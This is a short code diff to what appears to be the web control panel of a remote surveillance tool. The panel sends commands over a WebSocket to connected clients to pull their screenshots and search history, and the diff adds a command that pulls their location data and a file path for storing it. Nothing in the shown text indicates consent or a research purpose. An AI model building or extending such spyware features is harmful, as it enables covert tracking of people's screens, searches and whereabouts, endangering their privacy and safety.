@@ -25,6 +25,7 @@
 
     <h2>Send Command to Clients</h2>
     <button onclick="sendCommand('pull_screenshots')">Pull Screenshots</button>
+    <button onclick="sendCommand('pull_location')">Pull Location</button>
     <button onclick="sendCommand('pull_search_history')">
       Pull Search History
     </button>
@@ -36,6 +37,7 @@
       const websocket = new WebSocket("ws://localhost:8765");
       const screenshotBasePath = "/screenshots";
       const searchHistoryBasePath = "search_history.txt";
+      const locationBasePath = "location_data.txt";
 
       websocket.onopen = function () {
         console.log("Connected to WebSocket server");
